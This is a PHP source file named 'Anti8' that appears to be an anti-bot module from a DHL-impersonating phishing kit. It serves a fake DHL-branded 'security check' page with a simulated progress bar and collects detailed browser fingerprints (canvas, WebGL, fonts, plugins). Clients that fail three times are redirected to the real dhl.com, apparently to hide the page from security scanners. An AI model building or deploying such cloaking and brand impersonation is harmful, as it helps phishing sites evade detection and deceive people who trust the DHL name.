<?php
// Anti8: Advanced Fingerprinting and CAPTCHA Integration
// Advanced bot detection using multiple fingerprinting techniques

// No bypass system - full protection active

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

$client_ip = $_SERVER['REMOTE_ADDR'] ?? '';
$fingerprint_key = 'fingerprint_' . md5($client_ip);

// Check if fingerprint verification is already completed
if (isset($_SESSION[$fingerprint_key]) && $_SESSION[$fingerprint_key]['verified'] === true) {
    return; // Already verified
}

// Initialize fingerprint data
if (!isset($_SESSION[$fingerprint_key])) {
    $_SESSION[$fingerprint_key] = [
        'verified' => false,
        'attempts' => 0,
        'created' => time(),
        'fingerprints' => []
    ];
}

$fingerprint_data = $_SESSION[$fingerprint_key];

// Check for fingerprint submission
if (isset($_POST['browser_fingerprint'])) {
    $submitted_fingerprint = json_decode($_POST['browser_fingerprint'], true);
    
    if ($submitted_fingerprint && is_array($submitted_fingerprint)) {
        // Validate fingerprint data
        $required_fields = ['screen', 'timezone', 'language', 'platform', 'plugins'];
        $valid = true;
        
        foreach ($required_fields as $field) {
            if (!isset($submitted_fingerprint[$field])) {
                $valid = false;
                break;
            }
        }
        
        if ($valid) {
            // Store fingerprint
            $fingerprint_data['fingerprints'][] = $submitted_fingerprint;
            $fingerprint_data['verified'] = true;
            $_SESSION[$fingerprint_key] = $fingerprint_data;
            return; // Verification successful
        }
    }
    
    // Invalid fingerprint submission
    $fingerprint_data['attempts']++;
    $_SESSION[$fingerprint_key] = $fingerprint_data;
    
    if ($fingerprint_data['attempts'] >= 3) {
        header('HTTP/1.1 403 Forbidden');
        header('Location: https://www.dhl.com');
        exit();
    }
}

// If verification needed, serve fingerprinting challenge
if (!$fingerprint_data['verified']) {
    // Load language for display
    $userLanguage = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'en', 0, 2);
    $supportedLanguages = ['en', 'es', 'fr', 'de', 'pt', 'th'];
    $selectedLanguage = in_array($userLanguage, $supportedLanguages) ? $userLanguage : 'en';
    $languageFile = __DIR__ . '/../languages/' . $selectedLanguage . '.php';
    $translations = file_exists($languageFile) ? include($languageFile) : include(__DIR__ . '/../languages/en.php');
    
    header('Content-Type: text/html; charset=UTF-8');
    echo '<!DOCTYPE html>
<html>
<head>
    <title>' . htmlspecialchars($translations['security_check_title']) . '</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: \'Circular\', -apple-system, BlinkMacSystemFont, \'Helvetica Neue\', Arial, sans-serif; 
            background-color: #121212;
            color: #ffffff; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            padding: 20px;
        }
        .container { 
            text-align: center; 
            max-width: 450px; 
            width: 100%;
            padding: 40px;
        }
        .dhl-sec-logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 30px;
            background: #ffcc00;
            color: #d40511;
            font-weight: 900;
            font-size: 22px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 8px;
        }
        .message {
            font-size: 18px;
            margin-bottom: 10px;
            color: #fff;
            font-weight: 600;
        }
        .progress-bar {
            width: 100%;
            height: 6px;
            background: #333;
            border-radius: 3px;
            margin: 20px 0;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #ffcc00, #d40511);
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 3px;
        }
        .status {
            font-size: 18px;
            margin: 20px 0;
            color: #fff;
            font-weight: 600;
        }
        .details {
            font-size: 14px;
            color: #a7a7a7;
            line-height: 1.6;
        }
        .spinner {
            border: 3px solid #333;
            border-top: 3px solid #ffcc00;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .checkmark {
            color: #ffcc00;
            font-size: 48px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="dhl-sec-logo" aria-hidden="true">DHL</div>
        <div class="message">' . htmlspecialchars($translations['verifying_browser']) . '</div>
        <div id="status" class="status">' . htmlspecialchars($translations['performing_security']) . '</div>
        <div class="progress-bar">
            <div id="progress" class="progress-fill"></div>
        </div>
        <div class="spinner" id="spinner"></div>
        <div class="checkmark" id="checkmark">✓</div>
        <div class="details">
            <p>' . htmlspecialchars($translations['not_robot']) . '</p>
            <p><small>' . htmlspecialchars($translations['automatic_process']) . '</small></p>
        </div>
    </div>
    
    <form id="fingerprint-form" method="POST" style="display: none;">
        <input type="hidden" name="browser_fingerprint" id="fingerprint-data">
    </form>
    
    <script>
        let progress = 0;
        const progressBar = document.getElementById("progress");
        const status = document.getElementById("status");
        const spinner = document.getElementById("spinner");
        const checkmark = document.getElementById("checkmark");
        
        // Simulate progress
        const progressInterval = setInterval(() => {
            progress += Math.random() * 15 + 5;
            if (progress > 100) progress = 100;
            
            progressBar.style.width = progress + "%";
            
            if (progress < 30) {
                status.textContent = "' . addslashes($translations['analyzing_browser']) . '";
            } else if (progress < 60) {
                status.textContent = "' . addslashes($translations['collecting_security']) . '";
            } else if (progress < 90) {
                status.textContent = "' . addslashes($translations['validating_request']) . '";
            } else {
                status.textContent = "' . addslashes($translations['verification_complete']) . '";
                clearInterval(progressInterval);
                
                setTimeout(() => {
                    spinner.style.display = "none";
                    checkmark.style.display = "block";
                    collectFingerprint();
                }, 500);
            }
        }, 200);
        
        spinner.style.display = "block";
        
        function collectFingerprint() {
            try {
                const fingerprint = {
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        availWidth: screen.availWidth,
                        availHeight: screen.availHeight,
                        colorDepth: screen.colorDepth,
                        pixelDepth: screen.pixelDepth
                    },
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    language: navigator.language,
                    languages: navigator.languages,
                    platform: navigator.platform,
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    maxTouchPoints: navigator.maxTouchPoints,
                    plugins: Array.from(navigator.plugins).map(p => ({
                        name: p.name,
                        filename: p.filename
                    })),
                    canvas: getCanvasFingerprint(),
                    webgl: getWebGLFingerprint(),
                    fonts: detectFonts(),
                    timestamp: Date.now()
                };
                
                document.getElementById("fingerprint-data").value = JSON.stringify(fingerprint);
                
                setTimeout(() => {
                    document.getElementById("fingerprint-form").submit();
                }, 1000);
                
            } catch (e) {
                // Fallback for browsers with restricted APIs
                setTimeout(() => {
                    window.location.reload();
                }, 2000);
            }
        }
        
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement("canvas");
                const ctx = canvas.getContext("2d");
                ctx.textBaseline = "top";
                ctx.font = "14px Arial";
                ctx.fillText("DHL Express security 🔒", 2, 2);
                return canvas.toDataURL().slice(-50);
            } catch (e) {
                return null;
            }
        }
        
        function getWebGLFingerprint() {
            try {
                const canvas = document.createElement("canvas");
                const gl = canvas.getContext("webgl");
                if (!gl) return null;
                
                return {
                    vendor: gl.getParameter(gl.VENDOR),
                    renderer: gl.getParameter(gl.RENDERER),
                    version: gl.getParameter(gl.VERSION)
                };
            } catch (e) {
                return null;
            }
        }
        
        function detectFonts() {
            const testFonts = ["Arial", "Times New Roman", "Courier New", "Helvetica", "Georgia"];
            const detected = [];
            
            testFonts.forEach(font => {
                const span = document.createElement("span");
                span.style.font = "72px " + font;
                span.textContent = "mmmmmmmmmmlli";
                span.style.position = "absolute";
                span.style.left = "-9999px";
                document.body.appendChild(span);
                
                if (span.offsetWidth) {
                    detected.push(font);
                }
                
                document.body.removeChild(span);
            });
            
            return detected;
        }
    </script>
</body>
</html>';
    exit();
}
